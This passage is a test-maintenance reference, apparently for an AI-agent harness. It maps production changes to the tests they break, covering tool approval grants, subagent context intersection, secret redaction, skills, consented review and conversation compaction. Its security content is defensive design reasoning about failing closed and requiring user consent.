| Rename the `## Persistent objective` marker or move goal assembly out of `core.loop.with_goal` | `test_goal_persists_and_injects_into_prompt` fails | The marker lives in `with_goal()` so the CLI wrapper and TUI worker cannot drift; keep both calling it |
| Make `child_context` a union instead of an intersection | `test_ac1_*` fail | C6: intersection, never union — a restricted parent must not escape via a permissive child |
| Remove the `callable_only` drop from `schemas()` | `test_headless_filter_hides_approval_gated_mcp_tool` fails | The headless rule is the §15-17 finalization: uncallable-without-a-channel tools are not advertised, and `headless_hidden()` feeds the once-per-process WARNING |
| Register a dynamically-named probe tool without the `mcp__` prefix in dispatch tests | `ToolCallDenied: ... disabled by policy` | Unknown non-`mcp__` names are denied by design; use `mcp__*` names for probes (allowed by default, approval-gated, so pass an `approval_callback`) |

---

## General regeneration: when a production change breaks several tests at once

If a planned refactor (e.g. ROADMAP §3's JSON-retry, §10's ensemble mode)
breaks multiple tests across multiple files:

1. Read the planned change in ROADMAP.md to understand the NEW contract.
2. Update the canned/pinned values in tests to match the new contract,
   NOT to silently absorb the change.
3. If a regression test (the ROADMAP §4 "three verbatim cases") breaks
   on a planned refactor, that's a signal the refactor is changing a
   guarded invariant — STOP and re-evaluate the refactor against the
   original motivation for the invariant before updating the test.
4. Update this file to document the new break surface for the next
   maintainer.

---

## 14. §14–§18 review fixes

| If you change | You break | Fix |
|---|---|---|
| Remove `ToolSpec.grant_scope` or stop consulting it in `_run()` | `test_s1_grant_means_one_prompt_per_turn_not_per_spawn` | The §18 sign-off asks once per RUN, not per call. The loop learns which tools work that way from `registry.grant_scope()`, never by name |
| Remove `ToolSpec.approval_notice` or the `notice` key on `permission_request` | `test_permission_channel_yields_request_and_dispatches_on_approval` | The event carries `notice` (often `None`). It is what tells the user what approving a spawn actually authorises |
| Add a name to `_INJECTABLE_PARAMS` without adding it to `dispatch()`'s injection map | `KeyError` at dispatch time | Deliberate. The previous ternary silently injected `parent_run` under any third name |
| Make `child_context` replace rather than union `approval_overrides` | `test_s2_parent_approval_tightenings_reach_the_child` | S2: approval composes like tool access. Only `True` entries carry |
| Stop forwarding `permission_channel` from `spawn_subagent` | `test_spawn_forwards_the_channel_and_the_grant` | Without it the child runs headless and loses every approval-gated tool, including all MCP tools |
| Set `ToolApprovals.spawn_subagent = False` again | `test_spawn_subagent_permission_declared` | Approving the spawn IS the sign-off; without it there is nothing to grant against |
| `clear_dynamic_approval_defaults(prefix)` | `TypeError` — it takes exact names now | It over-matched: clearing `mcp__fs__read` also cleared `mcp__fs__read__x`. No-arg still clears all |
| `unregister_all` scanning by prefix again | `test_unregistering_one_server_leaves_a_prefix_sibling_intact` | Server `fs`'s prefix also matches server `fs__read`'s tools |
| Send `effort` without `effort_for()` | `test_run_validates_effort_against_the_model_it_is_about_to_call` | `_run()` is the single enforcement point; every path to the wire goes through it |
| Cache a failed effort lookup | `test_a_failed_lookup_is_not_cached` | One transient error would suppress the capability query for the whole process |
| Return the container unchanged at `_MAX_REDACT_DEPTH` | `TestDepthCapFailsClosed` | The cap stops stack exhaustion; failing open made it a deterministic redaction bypass |
| Drop `"error"` from `_SCANNED_KEYS` | `TestErrorChannelRedaction` | MCP reports failures in band, so third-party text lands there |
| Restore `always_update=True` on `RavenPanel.state` | `test_same_state_reassignment_does_not_redraw_the_raven` | Every token delta reassigns the same value |
| Build `ConversationMemory` in `on_mount` again | `test_launching_and_quitting_persists_no_thread` | Constructing one persists a thread row |

## §25 — authorized tool use in the research pipeline

| Change | What breaks | Fix / why |
|---|---|---|
| Make `registry.grantable()` return True for everything | `TestGrantability`, `TestTheLoopEnforcesGrantability` | A tool deciding approval from its PARAMS was never consented to by name. Ticking "shell" is not agreeing to whatever command the model later picks |
| Drop the `registry.grantable` term from `_run()`'s grant check | `TestTheLoopEnforcesGrantability` (2), `test_candidate_approvals_omits_tools_the_grant_cannot_cover` | The loop is the enforcement point; a stale or hand-built grant set must not widen anything |
| Stop filtering `candidate_approvals()` to grantable tools | `test_candidate_approvals_omits_tools_the_grant_cannot_cover` | The sign-off notice would promise authority the grant does not carry — worse than not offering it |
| Remove `PIPELINE_UNGRANTABLE` / add `spawn_subagent` back | `TestCandidates` | Approving a spawn IS §18's sign-off; pre-granting it unattended compounds one yes into unbounded delegated authority (R4) |
| Skip `grant_budget.take()` in the grant check | `TestGrantBudget` (3) | Pre-flight authorization gives up the natural bound on how many times a granted tool runs |
| Rebuild `GrantBudget` per pass instead of sharing it | `test_one_budget_is_shared_across_passes` | Multiplies the ceiling by the pass count while reading as if it enforced one |
| Make budget exhaustion deny instead of falling through | `test_exhaustion_falls_back_to_asking_not_to_failing`, `test_budget_exhaustion_falls_through_to_the_provider` | The ceiling would become a hard stop on a supervised run |
| `headless = permission_channel is None` again | `TestHeadlessIsAboutBeingUNABLEToAsk` | "Headless" means unable to ask. A pass with an `ApprovalProvider` CAN ask, so hiding its tools reports a limitation it does not have |
| Stop consulting `approval_provider` in `_obtain_approval` | `TestTheProviderAnswers` | `run_to_completion()` discards the `permission_request` event, so a queue alone blocks with nothing displayed |
| Let the provider win over a live `permission_channel` | `test_the_channel_wins_when_both_are_present` | The channel is the more specific arrangement; a provider would ask again about a question already on screen |
| Honour `grant_scope` regardless of the provider | `TestRunScope`, `test_the_provider_declines_run_scope` | R11: a mode whose purpose is per-call supervision must not let one yes cover later calls |
| Drop `authorization=` from `continue_conversation` | `test_the_json_retry_carries_it_into_the_same_thread` | A retry is the same pass continuing; omitting it strips the pass's tools on the attempt where the model is already struggling |
| Drop `**_authorization_kwargs(...)` from `run_deep_research_mode` | `test_the_pass_entry_point_unpacks_the_bundle_into_the_loop` | Every other test mocks over this layer, so all of them pass with the tools still hidden |
| Copy `granted_calls` onto the run at the end instead of sharing the list | `TestTheTrailSurvivesAFailedRun` | The trail would be lost on the failure path and at every §5 checkpoint — the runs most worth auditing |
| Write `granted_calls.json` unconditionally | `test_absent_when_nothing_was_granted` | Its presence is the signal that a run carried pre-flight authorization; an always-empty file gets skimmed past |
| Accept `research.granted_tools` in `settings.json` | `test_granted_tools_is_rejected_by_name` | Standing authorization carried by any cloned repo, in the one config file where project tier beats user tier (R12) |
| Make `--grant` an `nargs="?"` flag again | `TestTheCliFlag` (7) | An optional-value flag eats the next token, so `--grant-tools "my query"` consumed the QUERY and failed about a missing positional |
| Handle `--attended` and `--grant` in a fixed order rather than a loop | `test_the_two_flags_compose_in_either_order` | `--grant --attended q` left "--attended q" as the research question |
| Give `ask_permission_blocking` a private queue | `test_quitting_during_an_attended_research_prompt_releases_the_worker` | `_release_permission_channel` could not see it — a fourth uncovered dismissal route, and the failure is a HANG (f10) |
| Drop `check_input_policy` from `dispatch()` | `TestDispatchEnforcesItBeforeTheHandlerRuns` | Arguments are the one direction that leaves the harness, and nothing was watching it |
| Redact arguments instead of refusing | `test_refused_call_raises_and_the_handler_never_runs` | The tool would run with parameters neither the model nor the user chose, and report success |
| Set `scan_keys=False` on the input path | `test_secret_in_an_argument_key_is_refused` | A dict key is a legal place to put a string and the model writes them |
| Fail open at the input depth cap | `TestInputDepthCapFailsClosed` | Same reasoning as the output cap: refusing to descend must mean refusing to proceed |
| Remove the provenance framing from the universal preamble | `TestProvenanceFraming` | Defence-in-depth only — but it is one line in one place, and every pass inherits it |


## §19 — the skill system

| Change | What breaks | Fix / why |
|---|---|---|
| Make `_md_files` non-recursive for skills | `TestCategoryDiscovery` (5) | Category folders are the payoff: progressive disclosure puts every skill's name in every prompt, so a flat list of forty is what it exists to avoid |
| Make agents recurse too | `test_agents_stay_flat` | K4 is skills-only; `agents/builtin/` holds one file and speculative structure for it is structure nobody asked for |
| Stop deriving `category` from the folder | `TestCategoryDiscovery` (3) | Derived, never authored — a `category:` frontmatter key could disagree with where the file sits |
| Truncate `category` to the immediate parent | `test_nesting_deeper_than_one_level_keeps_the_full_path` | Silently merges two distinct groups in the catalog |
| Drop `dirs.sort()` from the walk | `test_walk_order_is_deterministic` (adversarial-enumeration form, review §19-20 r3-2) and `test_same_name_in_two_categories_collides_and_warns` | Collisions resolve first-wins, so filesystem order would decide WHICH definition loads. The old determinism test re-sorted by path before comparing and could not see this revert; it now monkeypatches the enumeration to present a hostile order and asserts sorted order beats filesystem order |
| Namespace the name by category (`security/recon`) | `test_the_name_is_not_namespaced_by_the_category` | `load_skill`, `/skill` and D18 all key on the name; changing it makes them operate on a different key than the catalog shows |
| Un-group `skill_catalog_text()` | `TestGroupedCatalog` (2) | — |
| Stop marking active skills in the catalog | `test_active_skills_are_marked_not_omitted` | Invites the model to spend a turn calling `load_skill` for a body already pinned into the same prompt |
| Give `SkillManager` session state (mutate the list in place) | `TestManagerHoldsNoState` | K3: the shell owns the active list. A stateful manager is what would make wiring a second shell a redesign rather than a call site |
| Sort activation order | `test_activation_order_is_preserved_not_sorted` | It is the order bodies are pinned in; a user activating general-then-specific is expressing a precedence |
| Pin every discovered skill rather than the active ones | `TestPromptFragment` | Defeats progressive disclosure entirely |
| Raise on an active name that no longer resolves | `test_an_active_name_that_no_longer_resolves_is_skipped` | Skills are rediscovered on `initialize()`; a name can legitimately stop resolving mid-session |
| Make `missing_tools()` ignore the `ToolContext` | `TestMissingTools` (2) | Note AC1's own example (`shell`) CANNOT catch this — it is globally disabled anyway. The discriminating case is a globally allowed tool the agent excluded |
| Make `missing_tools()` answer from anywhere but `registry.is_allowed` | `TestMissingTools` | Reporting one thing at activation and enforcing another mid-turn is the divergence the check exists to prevent |
| Make missing tools REFUSE activation | `test_activation_reports_missing_tools_without_refusing` | K2 reports and proceeds; refusing makes a restrictive agent silently un-pairable with half the catalog |
| **Append active bodies inside `with_catalogs()`** | `TestPromptAssembly`, incl. `test_k6_a_pass_prompt_never_carries_an_active_body` | **K6.** That function feeds `pass_prompt()`, so a skill activated in a TUI chat session would govern all ten passes of a separate research run |
| Stop passing `active_skills` into catalog assembly | `test_the_catalog_marks_active_skills_in_the_same_prompt` | The list must reach the catalog to MARK entries — just never to expand them |
| Make `active_skills` class-level or thread-persisted | `TestSessionScope` | K5: session-scoped like `/agent`, not persisted like `/goal` |
| Give a shipped default a tool it cannot have | `test_their_declared_tools_are_actually_available` | A builtin reporting a missing tool on every activation reads as the feature being broken |


## §20 — post-pipeline review with consented correction

Every row below was applied to the production code and confirmed to turn
the named test red. The paired rows exist because each half alone proves
nothing: "accept re-runs synthesis" passes against a version that always
re-synthesises, and "reject re-runs nothing" passes against one that
never does.

| Change | What breaks | Fix / why |
|---|---|---|
| Make `run_agent_conversation` ignore `authorization=` | `test_the_bundle_is_unpacked_into_the_loop` | §20's reviewer needs the run's grants, provider and budget; without this it runs unauthorised while every call site reads as if it were authorised |
| Drop the `authorization` + `granted_tools` guard | `test_passing_both_raises_rather_than_picking_one` | They set the same underlying argument, so one silently wins |
| Give `pipeline-reviewer` `spawn_subagent` | `test_it_cannot_spawn_subagents` | A reviewer delegating its own review compounds authority for nothing — §25's R4 excludes spawning from pipeline grants for the same reason |
| Declare a globally-denied tool on `pipeline-reviewer` | `test_its_declared_tools_are_actually_available` | `allowed_tools` narrows, so the name is dead weight; a builtin reporting missing tools reads as the feature being broken |
| Let the reviewer read project context or thread memory | `test_it_does_not_read_project_context_or_thread_memory` | Neither is evidence about whether a claim is true, and both are places a steer could be planted |
| Add a `consent` field to `RunAuthorization` | `test_run_authorization_has_no_consent_field` | That bundle answers "may this gated call proceed?"; consent answers "may this edit be applied?". §25's docstring warns against multiplying kinds of authorization inside it |
| Hardcode `pass_prompt(label)` inside the shared retry loop | `test_the_retry_continues_under_the_callers_system_prompt` | Looks right for all ten passes and hands the reviewer a source-grounding prompt mid-review |
| Fire `on_response` only on the final retry | `test_every_retry_response_reaches_the_on_response_hook` | §25's granted-call record hangs off it; a grant spent on the struggling attempt is exactly the call an unattended run's audit trail exists to show |
| **Apply findings when consent is None** | `TestNobodyToAskAppliesNothing` | **V6.** The property that keeps a mutating stage from widening the security stance — the inability to ask is not permission to proceed |
| **Discard findings when consent is None** | `TestNobodyToAskAppliesNothing` | The opposite failure of the same decision. An advisory review whose findings vanish is not advisory, it is discarded |
| **Re-synthesise unconditionally** | `test_reject_leaves_everything_alone` | **V2.** A fully-rejected review must change nothing |
| **Never re-synthesise** | `test_accept_rewrites_the_claim_and_re_runs_synthesis` | **V2, other half.** Otherwise `report.md` and `02_claims.json` contradict each other |
| Reuse the pre-review synthesis input | `test_the_re_synthesis_reads_the_CORRECTED_claims` | Regenerates from the UNCORRECTED claims — the report changes for no reason while the correction silently goes nowhere |
| Skip the `review_override` marker on a tier change | `test_a_tier_override_marks_the_score_breakdown` | `04_confidence.json` then shows a 0.91 raw_score beside a downgraded LOW and reads as a bug in the scoring formula |
| Apply every finding a refinement returns | `test_refinement_touches_only_its_own_finding` | A note about #1 must not silently redraft #2 — the user consented to reconsidering one thing |
| Let `reject_all` keep asking | `test_reject_all_stops_asking` | The escape a long review needs; it only ever declines, so it cannot turn fatigue into a reflexive accept |
| Treat an unrecognised consent answer as accept | `test_an_unrecognised_answer_is_a_rejection` | Every unclear answer is a rejection |
| Treat a raising consent callback as accept | `test_a_consent_callback_that_raises_is_a_rejection` | A shell torn down mid-prompt must not have its silence read as approval |
| Skip validation of `claim_id` / tier before asking | `TestFindingsAreValidatedBeforeAnyoneIsAsked` | Asking solicits consent for something that then silently does nothing |
| Truncate past `MAX_REVIEW_FINDINGS` silently, or not at all | `test_findings_past_the_cap_are_dropped_and_traced` | No silent caps — an untold truncation reads as "the reviewer found twenty-five things" |
| Pass `authorization=None` to the reviewer | `test_the_same_bundle_object_reaches_the_reviewer` | **V7.** Asserted on IDENTITY of the `GrantBudget`: a rebuilt one multiplies the run's ceiling while reading as if it enforced one |
| Run the reviewer (or its retry/refine continuations) with `context=None` | `test_the_reviewer_runs_under_the_reviewer_agents_context` plus the continuation-context tests (review §19-20 r2-1) | Its `.md` excludes `spawn_subagent`, and that only binds if the context built from it is the one EVERY turn of the review uses — turn 1 and every `retry_until_json`/`_refine` continuation. `retry_until_json` therefore takes a `context` parameter and forwards it |
| Stop recording the reviewer's granted calls | `test_the_reviewers_granted_calls_join_the_runs_audit_trail` | §25 keeps ONE list so a call cannot be authorised in one place and recorded in another |
| Make the review stage non-opt-in | `test_no_flag_and_no_consent_means_no_reviewer_call` | D9: it is an extra model call plus a re-synthesis |
| Require the config flag even with a consent route | `test_a_consent_route_alone_enables_it` | A shell that offered the user a consent route should not also need the flag |
| Never call `_review_stage` from the pipeline | `test_the_pipeline_calls_the_stage_after_final_synthesis` | Without this every other §20 test passes against code nothing calls |
| **Run the stage before final synthesis** | `test_the_pipeline_calls_the_stage_after_final_synthesis` | Every call still happens — the reviewer is just handed an empty report to judge. The test asserts ORDER for this reason |
| Make a missing reviewer agent fatal | `test_a_missing_reviewer_agent_skips_rather_than_failing` | Losing a completed ten-pass run over an optional stage is the wrong trade |
| Collapse `enabled` into `review is not None` | `test_enabled_with_no_consent_still_runs_and_reports` | `--review` on a piped run would then skip the review entirely and report nothing |
| Stop falling back to `config.SUBAGENT_REVIEW` | `test_the_pipeline_resolves_the_flag_from_config_when_unset` | Both shells pass `None`, so the config flag would do nothing |
| Default `--review` to `False` in argparse | `test_the_flag_defaults_to_none_so_settings_can_supply_it` | "Flag absent" must stay distinguishable from "flag given as false", or settings.json can never be honoured |
| Let settings beat the explicit flag | `test_precedence_is_flag_then_settings_then_config` | `--no-review` must escape a persisted `true` for one run |
| Build a consent object on a non-tty stdin | `test_a_non_tty_stdin_gets_no_consent_object` | V6 by construction; reading a decision off a pipe answers on the user's behalf with whatever bytes were there |
| Make the TUI decoder trust whatever arrives | `test_the_modal_answer_decoder_fails_safe` | The shutdown release puts a bare `False`; the first place where the unsafe failure is silently applying an edit |
| Let `ReviewScreen`'s escape dismiss with no value | `test_every_review_screen_dismissal_carries_a_decision` | The worker parks on a Queue inside the consent callback — fifth place this invariant applies |
| **Drop `write_run_artifacts` from the TUI worker** | `test_the_tui_worker_writes_them_too` | **V9.** It had ONE call site, so `/research` produced no `/output/<run_id>/` at all |
| Let an artifact failure propagate in the TUI | `test_a_writer_failure_does_not_lose_the_tui_run` | A full disk must not discard ten passes of completed work |
| Write `07_review.json` unconditionally | `test_absent_when_it_was_not` | Its presence is the signal that a run was reviewed; an always-empty file reads as "nothing happened here" |
| Remove `subagent_review` from `_KNOWN_RESEARCH` | `test_subagent_review_is_accepted` | Unknown settings keys RAISE, so an undeclared key is a startup error |

**Signature changes that ripple into existing tests.** `_split_research_flags` now returns `(attended, review, grant_spec, query)` — a 4-tuple, updated across `TestTheTuiFlagSplitter`. `run_deep_research_pipeline` takes `review=` and `subagent_review=`, both asserted positionally in `test_e2e.py` so a future default of "review and apply" cannot slip through. `_review_stage` takes `enabled=`.


## §19–§20 review follow-up (2026-08-05)

Every row applied to the production code and confirmed to turn the named
test red — except the one marked, whose failure mode is a *skip* and which
therefore has a direct test instead. That distinction is the standing
lesson from this pass: a revert check cannot see silence.

| Change | What breaks | Fix / why |
|---|---|---|
| Re-raise on a failed re-synthesis | `test_a_failed_re_synthesis_still_completes_the_run` | A provider error on that one call is the same transient class as a reviewer call failing, which f1 settled must not flip a finished ten-pass run to `failed`. Pinned by a test that composes with the real pipeline — the stage-level test cannot see a status |
| `log_outcomes(committed=True)` on the failure path | `test_a_failed_re_synthesis_leaves_claims_and_report_unchanged` | Traces "accepted and applied" beside claims that were reverted; the record has to agree with what it sits next to |
| Reinstate direct mutation in place of `apply_deferred`'s copy | `test_a_failed_re_synthesis_leaves_claims_and_report_unchanged` | Reopens f4 — a failed re-synthesis persists corrected claims beside the stale report, one run with two contradicting artifacts, durable |
| Count duplicates into the malformed counter | `test_malformed_and_duplicate_are_counted_separately` | A duplicate is a well-formed finding raised twice; one number covering two causes tells the reader neither |
| Go silent on the raced-click timeout branch | `test_the_no_answer_line_only_prints_when_there_was_no_answer` | Their answer went nowhere; silence sends them to the "N applied" summary to work that out and conclude the button is broken |
| **Make `with_catalogs` ignore the context** | `TestCatalogsFollowTheContext` (2) | The catalogs *instruct* the model to call `load_skill` / `spawn_subagent`; a restricted agent is told to call a tool it does not have and burns a denied call against `max_steps` |
| **Suppress both catalogs unconditionally** | `test_an_unrestricted_run_gets_both_catalogs` | **The control.** Without it every other catalog test also passes against a version that strips progressive disclosure from ordinary chat |
| Make `system_prompt_for` drop the context | `test_a_restricted_NON_reviewer_agent_gets_the_same_treatment` | The point of moving this to the producer: the rule must hold for an agent nobody thought about when writing it |
| Have `spawn_subagent` pass its own context, not `child` | `test_a_spawned_subagent_inherits_the_PARENTS_suppression` | C6 intersects with the parent, so a parent that excluded spawning must not have the catalog re-invite its child |
| Pass a context from `pass_prompt()` | `test_pass_prompts_are_unaffected` | The one way this change could reach the research pipeline; verified separately by hashing all ten prompts before and after |
| Drop `test_docs_consistency`'s narrowing guard | `test_the_documented_count_is_the_real_one` | A filtered run legitimately collects fewer; asserting anyway makes every single-file invocation fail |
| Loosen the ARCHITECTURE anchor to a bare `(\d+) tests` | `test_the_three_docs_state_the_same_test_count` | ARCHITECTURE lists a per-module count for every test file in its tree, so a loose pattern compares two unrelated numbers forever |
| Change one doc's count without the others | `test_the_three_docs_state_the_same_test_count` | All three get quoted, by different audiences |
| **Compare `markexpr` against `None`** | `test_the_default_invocation_is_not_treated_as_narrowed` | **Fails by SKIPPING, not by failing** — `pytest.ini`'s addopts always supplies `-m "not integration"`, so every run would skip and the file would look like coverage while the counts drifted. This is why the guard has a direct test rather than a revert-and-see-red |


## Standing: a revert check cannot see a test that SKIPS

The 2026-08-05 follow-up added `tests/test_docs_consistency.py`, whose
narrowing guard decides whether the count assertion runs at all. Get that
guard wrong in the permissive direction and a filtered run asserts against
a session of one item -- loud, obvious, fixed in a minute. Get it wrong in
the restrictive direction and EVERY run skips: the assertion never
executes, the file sits there looking like coverage, and the thing it
polices drifts exactly as before.

Reverting the production behaviour and watching for red cannot catch that,
because a skip is green. Where a test can decline to run, prove it runs --
`test_the_default_invocation_is_not_treated_as_narrowed` is the shape.


## §21a — compaction, the archive, and pinning (2026-08-05)

Every row below was applied to the production code and confirmed to turn the named
test red — 75 across the section's six commits, of which the load-bearing ones are
listed here.

Two rows are marked **CONTROL**. They exist because the assertions next to them pass
against a broken build without them: a version that compacts unconditionally, or one
that shows a summary for threads that were never compacted, satisfies almost every
other test in these files.

| Change | What breaks | Fix / why |
|---|---|---|
| Add a field to a table class without touching `ensure_columns` | `test_a_declared_column_missing_from_an_existing_table_is_added` | `create_all()` creates missing TABLES and never ALTERs. Every database predating the field raises "no such column" at read time, silently, and never on a machine with a fresh `app.db` |
| Drop the `DEFAULT` on an added column | `test_the_existing_row_survives_and_reads_the_declared_default` | SQLite fills existing rows with NULL, so `pinned` reads as None on exactly the messages most likely to be compacted |
| Compare raw type strings instead of affinity | `test_a_length_specifier_is_not_a_type_mismatch` | `VARCHAR(255)` vs `VARCHAR` warns at every startup; a warning that fires when nothing is wrong is one nobody reads when something is |
| Make an unrecognised watermark hide the prefix | `test_an_unrecognised_watermark_shows_everything` | A checkpoint naming a row this thread does not have is a fault. Showing everything costs tokens; hiding a prefix loses context and reports nothing |
| Let `history_through` keep pinned rows | `test_the_summary_span_excludes_pinned_rows` | AC2 — a pinned message is never in what the compactor is asked to summarize |
| Make `pinned_through` ignore its watermark | `test_a_pin_after_the_watermark_is_not_re_added` | The row is already in the tail; returning it twice grows the context compaction just ran to shrink |
| Give `archive_history` a checkpoint lookup | `test_archive_history_ignores_compaction_entirely` | AC1. The first version of this test compared two reads that agree trivially on an uncompacted thread — including under the revert. It now runs against a thread that HAS been compacted, the only state where the guarantee can fail |
| Persist the checkpoint summary as a `MessageLog` row | `test_the_summary_is_never_written_to_the_archive` | Puts derived content in an append-only archive, and the NEXT compaction summarizes the summary as if it were something the user said — chaining by accident on the path that means to re-derive (M8) |
| Drop the pinned re-inclusion from the derived view | `test_a_pinned_row_inside_the_covered_span_comes_back_verbatim` | One watermark cannot say "everything through K except these" (M9). Without it, the message the user explicitly asked to keep is the one that disappears |
| Make the summary an assistant message | `test_the_summary_leads_the_view_as_a_user_message` | The neutral shape has no system role; a leading user message is the one form all three providers accept |
| **Show a summary when there is no checkpoint** | `test_a_thread_with_no_checkpoint_looks_exactly_as_it_did` | **CONTROL.** Every pre-§21 caller resumes an uncompacted thread, and their behaviour must be byte-identical until the trigger first fires |
| Pin only the turn's first row | `test_pinning_one_turn_covers_the_whole_exchange` | A turn is a question and everything that answered it. Keeping the question while the answer is summarized is not what "keep this" means |
| Derive the trigger from `context_limit` | `test_the_trigger_is_a_working_set_target_not_the_window` | M1 — it can never fire there. `MAX_TOKEN_BUDGET` re-bills the whole prompt per step, so the thread is unusable at well under half of any modern window |
| Let a research pass use the working-set trigger | `test_a_research_pass_only_compacts_near_the_window` | M6. A pass is headless and already returns a distillation; routine compaction there spends on a judgment call nobody is watching |
| Remove the re-entrancy guard | `test_the_reentrancy_guard_stops_the_compactor_compacting` | The compactor is an agent, so compacting runs the loop, which evaluates the trigger |
| Release the guard only on the error path | `test_the_guard_is_released_after_a_compaction` | Left set, every later compaction in the process silently no-ops — a failure that reads as "compaction just never fires" |
| Fold up to the turn start rather than before it | `test_the_fold_boundary_is_always_a_turn_start` | M4. A `tool_result` with no preceding `tool_use` is an HTTP 400 on Anthropic — a hard wire error on the next call, not a degraded answer |
| Ignore any one of the three fold floors | `test_the_current_turn_is_never_foldable`, `test_the_keep_turns_floor_protects_recent_exchanges`, `test_the_keep_tokens_floor_can_win_over_the_turn_floor` | M5 — they compose, earliest wins. The current-turn floor is what makes the mid-turn valve safe by construction |
| Chain when re-derivation was configured (or never chain) | `test_rederive_summarizes_the_originals_not_the_last_summary`, `test_chaining_feeds_the_previous_summary_back_in` | M2. Re-deriving is what keeps exactly one summarization step between an original message and what the model sees |
| Accept an oversized summary without retrying | `test_an_oversized_summary_is_sent_back` | The retry re-enters the compactor's own thread so it sees its own output — §3's loop with a length check in place of a parse |
| Reject an undersized summary too | `test_a_summary_under_target_is_accepted_immediately` | Undershooting has already done the job; rejecting it spends a call to make the context bigger |
| Discard a summary still over target after retries | `test_a_summary_still_oversized_after_retries_is_used_anyway` | It is smaller than what it replaces. Discarding spends every retry and keeps the full history, leaving the thread as stuck with less budget to fix it |
| Record an empty summary as a checkpoint | `test_an_empty_summary_skips_compaction` | Replaces real history with nothing at all — the one outcome worse than not compacting |
| Crash on a missing compactor agent | `test_a_missing_compactor_agent_is_a_skip_not_a_crash` | Same containment §20 applies to a missing reviewer: an optional stage that cannot run must not take the turn down |
| Remove either loop hook | `test_compaction_fires_before_the_first_call_of_a_turn`, `test_the_valve_fires_between_steps_of_one_turn` | M3. The boundary is primary; the valve exists because one turn can add far more than any buffer covers |
| Include the in-progress turn in `_completed_turns` | `test_the_valve_never_folds_the_current_turn` | The off-by-one IS the structural floor |
| Carry notices only on the LoopEvent | `test_the_notice_reaches_the_response_as_well_as_the_event`, `test_the_cli_prints_a_notice_carried_on_the_response` | `run_to_completion()` discards non-final events, so the CLI and the pipeline see only the response. Third time this shape has appeared (§20, §25) |
| Repeat the early warning on every step | `test_the_early_warning_fires_once_and_compacts_nothing` | The condition holds until compaction fires; the same line eight times in one turn trains the reader to skip it |
| Let a failed compaction propagate | `test_a_failed_compaction_does_not_fail_the_turn` | It is a model call, and a provider error during it must not take down a turn that was otherwise fine |
| **Compact unconditionally** | `test_a_thread_under_the_threshold_is_left_alone` | **CONTROL.** Almost every turn is this one |
| Gate `pin` on approval | `test_pin_needs_no_approval_anywhere` | D26. §13 does not merely deny an approval-gated tool where nothing can ask — it stops advertising it, so `pin` would be invisible on the CLI and in every research pass |
| Drop `pin`'s `available_check` | `test_pin_is_hidden_when_there_is_no_compactor` | Pinning is protection FROM compaction; with no compactor it only sets a flag nothing reads — the `fetch_url` defect shape (D24) |
| Check `isinstance(last_n, int)` without excluding bool | `test_a_boolean_count_is_rejected` | `isinstance(True, int)` is True, so `last_n: true` pins one turn while looking understood. Same trap `max_steps` hit in config_loader and column defaults hit in database.py |
| Stop injecting `memory` into dispatch | `test_the_live_memory_is_injected` | `pin` has no other way to reach the thread |
| Skip `effective_compaction`'s relationship checks | `test_an_incoherent_value_is_rejected` (8 cases) | AC8, and §21's own instruction. A `warning_margin` at or above the trigger fires the warning after the thing it warns about |
| Drop the budget-headroom warning | `test_a_trigger_too_close_to_the_budget_warns` | M1's arithmetic, enforced rather than left in a comment |
| Ignore an unknown `/compact` option | `test_an_unrecognised_option_is_an_error` | `--strenght 4` would compact at the default while the user believes otherwise, and the result looks exactly like a compaction that obeyed them |
| Skip `/compact`'s pre-flight validation | `test_an_out_of_range_strength_is_refused_before_a_model_call` | Otherwise `--strength 9` spends a call and fails inside a worker |
| Let `/compact` create a thread | `test_compacting_an_empty_thread_says_so` | Reading `app.memory` persists a `ConversationThread` row for a conversation that never happened — the phantom-thread bug the memory property exists to avoid |
| Leave `_busy` set when a manual compaction fails | `test_a_failed_manual_compaction_releases_the_busy_flag` | The app then refuses every later turn with "still working", which reads as a hang |

### Two standing notes

**`conftest.MEMORY_STORAGE_SYMBOLS` and `FakeMemory` are single-sourced on
purpose.** Both existed as several copies before §21a, and both drifted the moment
production gained a method: five symbols added to `core/memory.py` broke a JSON-retry
test with `'dict' object has no attribute 'desc'`, and three methods added to the
memory contract turned 43 tests red at once. Adding a storage import to
`core/memory.py` means adding one name to that tuple; adding a method the loop calls
on a memory means adding it to `FakeMemory`. Do not re-copy either.

**~~`test_shell_compaction.py` has its own `_settle`, copied rather than imported.~~**
~~`test_tui.py`'s version is TECHNICAL_DEBT theme 8 — it budgets event-loop pumps
rather than time. Importing it would make a fix there silently change this file's
timing too. Whoever fixes theme 8 should fix both.~~

**Superseded 2026-08-07 (TECHNICAL_DEBT 8 closed).** There is now one helper,
`settle` in `tests/conftest.py`, and every pilot test imports it. The note above
was sound while the canonical helper was broken and became exactly wrong when it
was fixed — the argument for copying was "don't couple to something known-bad",
and coupling is the point once it is good. It also under-counted: there were
**five** implementations, not two (budgets 40/60/120/120/200, and
`test_thread_legibility.py`'s was pause-then-check rather than check-then-pause),
so a fix to the one named by filename would have reached one of them.
`test_pilot_wait.py::test_no_test_module_defines_its_own_settle` now enforces
this, because a convention is what produced five copies.

### §21a review pass (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Count turns from `memory.messages` again | `test_compaction_makes_progress_every_time_it_runs` | M11. M8's summary is a `user` message that is not a turn, so a view-derived count is off by one AND in a different space from the archive indices `compactable_span` compares it against. This shipped: the watermark went backwards and the second compaction of a thread un-compacted it |
| Measure the keep-tokens floor over the view | `test_the_token_floor_measures_the_archive_not_the_view` | Same root cause, second counter. The walk runs out of view turns before it runs out of budget, so the floor under-protects on exactly the threads that have been compacted before |
| Have the loop compute the floor itself | `test_the_valve_asks_the_memory_for_the_current_turn_floor` | `ConversationMemory.completed_turns()` is the only source. `core/loop.py` imports no storage and should not start |
| Drop `compact()`'s no-progress check | `test_no_new_turns_means_no_model_call` | `save_checkpoint` refuses the write anyway, but the model call happens BEFORE that — a thread over the threshold would pay for a summary on every step that produces nothing |
| Drop `save_checkpoint`'s refusal | `test_a_backwards_watermark_is_refused` | The caller-side check covers only the one caller that exists today. `latest_checkpoint` resolves by timestamp, so a backwards watermark does not merely fail to help — it becomes the live one |
| Make `advances()` accept an equal watermark | `test_an_unchanged_watermark_is_refused` | Equal is not progress; accepting it lets a thread rewrite the same checkpoint forever, one model call each time |
| Un-gate the headroom advisory | `test_the_headroom_advisory_is_silent_off_the_startup_path` | `effective_compaction()` is on `should_compact()`'s path — once per step of every turn. Only the ADVISORY is gated; validation still raises everywhere (`test_validation_still_raises_off_the_startup_path`) |
